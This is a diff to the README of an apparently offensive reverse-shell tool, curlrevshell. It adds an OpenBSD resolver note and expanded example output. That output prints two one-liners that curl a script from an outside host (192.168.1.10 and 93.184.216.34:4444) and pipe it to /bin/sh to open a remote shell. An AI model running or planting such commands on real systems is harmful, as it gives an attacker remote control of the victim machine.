@@ -155,13 +155,27 @@ Adds whatever address [icanhazip.com](https://icanhazip.com) gives back to the
 list on one-liners printed on startup.  Functionally equivalent to
 `-address "$(curl https://icanhazip.com)"`.
 
+On OpenBSD, this requires using the
+[cgo resolver](https://pkg.go.dev/net#hdr-Name_Resolution), which can be done
+with setting the `ASR_CONFIG` environment variable to a non-empty string.
+
 Handy for situations where there's inbound NAT happening and keystrokes are at
 a premium.
 
-### Example
+### Examples
 Also print a one-liner for our external (hopefully) address.
 ```
 $ curlrevshell -icanhazip
+17:16:07.924 Listening on 0.0.0.0:4444
+17:16:07.924 To get a shell:
+
+curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10/c' | /bin/sh
+curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://93.184.216.34:4444/c' | /bin/sh
+```
+
+On `OpenBSD`.
+```
+$ ASR_CONFIG=1 curlrevshell -icanhazip
 17:16:07.924 Listening on 0.0.0.0:4444
 17:16:07.924 To get a shell:
 
